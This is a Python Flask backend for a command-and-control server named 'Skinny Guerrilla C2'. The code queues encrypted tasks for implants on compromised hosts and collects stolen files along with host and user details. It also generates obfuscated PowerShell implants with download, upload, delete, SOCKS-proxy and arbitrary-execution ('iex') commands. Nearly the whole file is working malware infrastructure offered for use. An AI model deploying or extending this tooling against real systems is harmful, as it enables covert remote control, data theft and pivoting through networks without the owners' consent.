###############################################################################
#                          SKINNY GUERRILLA C2 SERVER                          
#     _____ _    _                      _____                      _ _ _       
#    / ____| |  (_)                    / ____|                    (_) | |      
#   | (___ | | ___ _ __  _ __  _   _  | |  __ _   _  ___ _ __ _ __ _| | | __ _ 
#    \___ \| |/ / | '_ \| '_ \| | | | | | |_ | | | |/ _ \ '__| '__| | | |/ _` |
#    ____) |   <| | | | | | | | |_| | | |__| | |_| |  __/ |  | |  | | | | (_| |
#   |_____/|_|\_\_|_| |_|_| |_|\__, |  \_____|\__,_|\___|_|  |_|  |_|_|_|\__,_|
#                               __/ |                                          
#                              |___/                                           
#
# resources.py
# Flask app backend, manages what we display to the web browser, and makes 
# calls to our sql backend.
#
# inspired by https://github.com/shogunlab/building-c2-implants-in-cpp
# modified by JCSteiner

############################## LOAD DEPENDENCIES ##############################
# imports flask modules for API calls and giving responses to requests
from flask import request, Response, render_template
from flask_restful import Resource

# imports functions from our helper files
from src.sql_db import *
from src.obf import obf_powershell
from src.crypto import *

# imports the ability to start subprocesses
import subprocess
# imports the ability to run os commands
import os
# imports the ability to encode/decode base64 commands
import base64

import requests
from datetime import datetime, timezone
import shlex

########################## GLOBAL HELPER FUNCTION(S) ##########################

# takes in a tasks list and formats it in an easy to read format
def format_tasks(tasks):

    # starts with our string headers for the table
    working_str = """
                <table>
                <tr>
                <th> TASK ID </th><th> TASK TYPE </th><th> TASK OPTIONS </th><th>IMPLANT ID</th>\
                    <th> TASK RESULTS</th><th>TASK TIME</th> <th> RESULT TIME </th>
                </tr>
                """

    # loops through each task in our tasks output, and formats them into an html table
    for task_str in tasks:
        working_str += f'<tr><td>{task_str[0]}</td><td>{task_str[1]}</td><td>{task_str[2]}</td>\
            <td>{task_str[3]}</td><td>{task_str[4]}</td><td>{task_str[5]}</td><td>{task_str[6]}</td></tr>'

    # appends the ending table tag
    working_str += '</table>'

    # returns the final string we made
    return working_str

# define a helper function to make a post request
def api_post_request(ip_addr, endpoint, payload):
    response_raw = requests.post(ip_addr + endpoint, data=payload, verify=False).text
    return response_raw

############################### TASKS PAGE CLASS ##############################

# defines our tasks class as a resource of our flask app
class Tasks(Resource):
    
    # everytime we GET to the /tasks page
    def get(self, implant_id):

        # gets pending tasks from our mysql database
        tasks = get_pending_tasks(implant_id)

        displaystr = ''

        for t in tasks:

            # huge one liner here. I'll break it up into multiple lines of comments
            # 1. first we are only working with a single task string at a time. so this iterates for each task string
            # 2. we convert the task string to an actual string. this is the str(t). otherwise it'd be a list of tuples
            # 3. we strip ([()]) which takes off the list and tuple brackets, so it's a straight csv now.
            # 4. then we split that string over ', ' since that was how our list came back displaying. this gets
            # us the straight values as a list. we then rejoin the lists over commas.
            # the goal of this was to display nothing but the important stuff to the program. so we can easily
            # parse it with the implant

            task_str = ','.join([_.strip("''") for _ in str(t).strip("[()]").split(', ')])
            task_sig = sign_task(task_str, implant_id)
            displaystr += ''.join(encrypt((task_str + ',' + task_sig).encode(), implant_id).decode().split('\n'))
            displaystr += '\n'

        # encodes output and displays to end user
        return Response(displaystr.encode(), status=200)

    # we add tasks by POST-ing to the /tasks page
    def post(self, implant_id):

        # parses out any data from the request
        body = request.data.decode()

        # splits the body into the list of values (we arbitrarily chose to comma separate)
        val_list = shlex.split(body)

        if len(val_list) > 0:

            task_type = val_list[0]

            # gets from the sqlite database all commands that the implant was generated to use
            possible_commands = get_implants_possible_commands(implant_id)

            # if the task_type is one of the commands the implant was built w/ or one of the
            # two default commands
            if task_type in str(possible_commands + ["exit", "checkin"]):
                
                # gets current zulu time
                task_time = datetime.now(timezone.utc)

                if len(val_list) > 2:

                    task_opt = ';'.join(val_list[1:-1])
                else:
                    task_opt = ''

                # the operator that ran it
                operator = val_list[-1]

                # add task function call with task_type, task_opt, implant_id
                add_task(task_type, task_opt, implant_id, task_time, operator)

            # if we type "help" it gives us the help for different commands
            elif task_type.lower() == "help":

                print('[+] Commands allowed are:', possible_commands)

            elif task_type.lower() == "notes":

                if len(val_list) > 1:
                    task_opt = ''.join(val_list[1:-1])

                add_notes(implant_id, task_opt)

            # if we can't resovle the specific command, errors out at the server so we don't send
            # faulty data to the implant
            else:
                print("[!] Invalid Command Syntax.")

        else:

            print("[!] Invalid Command Syntax!")

        # return response with 200 code.
        return Response(status=200)
    

############################## RESULTS PAGE CLASS #############################

# much like the tasks class, we get to see results of tasks, and post to add
# results from tasks we've run
class Results(Resource):

    # list finished tasks
    def get(self, implant_id):

        # tasks = call get finished tasks from database
        tasks = get_finished_tasks()

        # encodes and displays
        return Response(format_tasks(tasks).encode(), status=200)

    # add results from tasks we've finished
    def post(self, implant_id):

        # parse out any data from the request
        body = decrypt(base64.decodebytes(request.data), implant_id).decode()

        # splits the body into the list of values
        val_list = body.split('<br>')

        # if we are getting tasks from the implant, then we expect the form task_id,results,result_time
        if len(val_list) == 5:

            # we can assume data will be sent to us in the form: task_id, results, result_time,
            # sa, and then digest
            task_id = val_list[0]
            results = val_list[1]
            result_time = val_list[2]
            sa = val_list[3]
            digest = base64.decodebytes(val_list[4].encode())
            

            # breaks over the <br> tag we input to reassemble everything in the request
            # except the last item which is the digest
            body_before_hash = '<br>'.join(val_list[:-1]).encode()

            # verifies the signature on the result string
            if verify_results(body_before_hash, digest, implant_id):

                # prints the results to the terminal and write to a file
                print(results)

                try:

                    # if the task as a download task 
                    task_type, operator = get_task_type(task_id)
                    if task_type == "download":

                        # checks to see whether a download file already exists
                        # this tells us whether to create a new file or append to an
                        # existing file
                        if os.path.exists('./downloads/Download' + task_id):
                            append_write = 'ab'
                        else:
                            append_write = 'wb'

                        # opens the downloads file
                        outfile = open('./downloads/Download' + task_id, append_write)
                        outfile.write(bytearray([int(r) for r in results.split()]))
                        outfile.close()
                        print('[+] Wrote download to ./downloads/Download'+task_id)

                    # if the task was a checkin task
                    elif task_type == "checkin":

                        # parese the sa list
                        sa_list = sa.split('<sa>')

                        # prettily print the sa to the terminal
                        if len(sa_list) == 9:
                            print(f'Implant ID: {implant_id}\nChecking in with SA:')
                            print(f'IPCONFIG:\t {sa_list[0]}')
                            print(f'MAC:\t {sa_list[1]}')
                            print(f'DHCP:\t {sa_list[2]}')
                            print(f'HOSTNAME: {sa_list[3]}')
                            print(f'USERNAME: {sa_list[4]}')
                            print(f'DOMAIN:\t {sa_list[5]}')
                            print(f'FQDN:\t {sa_list[6]}')
                            print(f'PID:\t {sa_list[7]}')
                            print(f'PPID:\t {sa_list[8]}')
                        
                # if we error out during any of that, just move on
                except:
                    pass
                

                if task_type == "upload" or task_type == "download":
                    results = ''

                # add results function call with task_id, results, result_time
                # adds this to the task database and also logs
                add_result(task_id, results, result_time)
                log(sa, task_id, results, implant_id, task_type, result_time, operator)
            else:

                # if we get an error trying to verify the hash or decode something, tells us
                print("[!] COULD NOT VERIFY RESULTS {body} from implant {implant_id}")
        else:
            # print that we recieved an invalid response string from the implant. 
            print("[!] Invalid input to /results.")

        # return response with 200 code.
        return Response(status=200)
    

############################## HISTORY PAGE CLASS #############################

# displays all implant tasks and their status
class History(Resource):
    # Lists all tasks
    def get(self):

        # formats the tasks table in a pretty way
        tasks = get_all_tasks()
        return Response(format_tasks(tasks).encode(), status=200)

    # No functionality
    def post(self):

        # return response with 200 code.
        return Response(status=200)
    
############################## IMPLANT PAGE CLASS #############################

# used to create and serve implants of different formats
class Implant(Resource):

    # serves the implant that was most recently created
    def get(self, format):

        # null response to account for if/else variable scoping issues
        resp = ''

        # if the format sub uri is for powershell
        if format == 'ps':

            # opens the most recent powershell payload, and reads it into our
            # response string
            infile = open('./implants/obf_powershell.ps1')
            resp = infile.read()
            infile.close()

        # if the sub uri can't be found, return that the payload was invalid
        else:
            resp = 'Invalid'

        # returns our response string and status 200
        return Response(resp.encode(), status = 200)
    
    # handles post requests. this creates payloads based on our C2 settings
    def post(self, format):

        # decodes the body of our request
        body = request.data.decode()

        # creates a dictionary for C2 settings 
        c2_params = dict()

        # read C2 params into the c2_params dictionary
        infile = open("c2_settings.conf")
        for line in infile:

            # parses the conf file
            line = line.strip().split(',')
            c2_params[line[0]] = line[1]
        infile.close()

        # finds what the next implant id should be, it's 1+max(rowid)
        new_implantid = get_new_implantid()

        # the keys to verify server tasks as well as sign implant results
        new_aes_key, new_aes_iv = new_crypto()

        # if our format is powershell
        if format == "ps":

            # initializes a null string
            payload_str = ''

            # writes our global variables to the implant
            payload_str += f'$implant_id = "{new_implantid}"\n'
            payload_str += f'$key = [System.Convert]::FromBase64String("{new_aes_key}")\n'
            payload_str += f'$iv = [System.Convert]::FromBase64String("{new_aes_iv}")\n'



            # initializes a string to be all the commands we'll use
            commands = ""

            # functions to include or not
            all_funcs = ['ipconfig', 'download', 'upload', 'dir', 'pwd', 'cd', 'rm', 'netstat-tcp', 'whoami', 'socks', 'iex']

            # for every function possible
            for func in all_funcs:

                # if the function is desired
                if func in body or 'all' in body:

                    # appends to the list of total commands, and write the function file to the payload
                    commands += func + ","
                    infile = open(f"../Implant/Powershell/{func}.ps1")
                    payload_str += infile.read() + '\n'
                    infile.close()

            # gets rid of the final comma
            commands = commands[:-1]

            # start of the pickjob function
            payload_str += """\nfunction func_pick_job
{
    param([string]$job,     
        [string]$job_args,   
        [string]$lcl_ip)            

    # picks the job and executes the command
    if ($job -eq "exit" -or $job -eq "checkin")
    {
        $results = ""
    }\n"""

            # loops through the functions again
            for func in all_funcs:
                if func in body or 'all' in body:

                    # what arguments to put into the specific function
                    args = ''
                    if func in ['download', 'upload', 'dir', 'cd', 'rm', 'iex']:
                        args = "$job_args"
                    elif func == 'socks':
                        args = "$lcl_ip $job_args"

                    # adds the else if to the pick job function
                    payload_str += f"\telseif($job -eq \"{func}\")\n\t{{\n\t\t$results = func_{func} {args}\n\t}}\n"

            # ends the else statement to the command
            payload_str += "\n\telse\n\t{\n\t\t$results = '[!] Invalid Command'\n\t}\n\n\treturn $results\n}\n\n"

            # adds each c2 param as a global variable IAW powershell syntax
            for key in c2_params:
                payload_str += f'${key} = "{c2_params[key]}"\n'

            # compile powershell script
            infile = open("../Implant/Powershell/template.ps1")

            # adds the template to the payload string
            payload_str += infile.read()

            # closes file handle
            infile.close()

            # writes to a file so it can be grabbed by the GET response
            outfile = open("./implants/powershell_payload_current.ps1", 'w')
            outfile.write(payload_str)
            outfile.close()

            # obfuscates the payload
            obf_powershell("./implants/powershell_payload_current.ps1", "./implants/obf_powershell.ps1")
            
            # adds the implant to the implants table
            add_implant(format, new_aes_key, new_aes_iv, commands)


            requests.post(f'http://{c2_params["ip"]}/{c2_params["task_uri"]}/{new_implantid}', data="checkin", verify=False)
            

            # sends a 200 code back to the client
            return Response(status = 200)

        # If the format isn't in the if/else statement, returns a 400 bad request
        return Response("Invalid payload format.".encode(), status = 400)


############################### UPLOAD PAGE CLASS #############################
class Upload(Resource):

    # get response to /upload/implant_id
    def get(self, implant_id):

        # displays the file intended to be uploaded to the implant
        infile = open(f"./uploads/uploadfile{implant_id}", 'rb')
        resp = infile.read()
        infile.close()
        
        return Response(resp, status = 200)

    # post response to /upload/implant_id
    def post(self, implant_id):

        body = request.data

        # writes the body that was sent to disk on the server so it can be served up later
        outfile = open(f"./uploads/uploadfile{implant_id}", 'wb')
        outfile.write(body)
        outfile.close()

        return Response(status = 200)  
    

############################### SOCKS PAGE CLASS ##############################
class Socks(Resource):

    # no functionality
    def get(self, implant_id):

        return Response(status = 200)
    

    # what to do when a post is sent to /socks/implant_id
    def post(self, implant_id):

        # the body is parsed as the command line arguments to the socks server
        body = request.data.decode().split()
        args = ''.join(body[1:]).split(';')

        # if we're starting the socks server
        if body[0] == 'start' and len(args) == 4:

            # stars a child process for the socks server
            process = subprocess.Popen(['python', './src/socks_server.py', args[0], args[1], args[2], args[3]])
            newpid = process.pid

            # records the pid of the socks server in the sqlite database
            add_socks_server(implant_id, newpid)

            print(f'[+] Started local socks server with pid: {newpid}')

        # if we're stopping the socks server
        elif body[0] == "stop":

            # gets the pid of the socks server from the database
            newpid = get_socks_pid(implant_id)[0]
            
            # attempts to kill the process, and if successful, removes it from the database
            try:
                process = subprocess.Popen(['python', '-c', f"import os, signal; os.kill({newpid}, signal.SIGKILL)"])
                
                remove_pid(implant_id, newpid)
            except:
                print(f'[!] Could not kill socks server with PID {newpid}. Not deleting record from db')

        return Response(status = 200)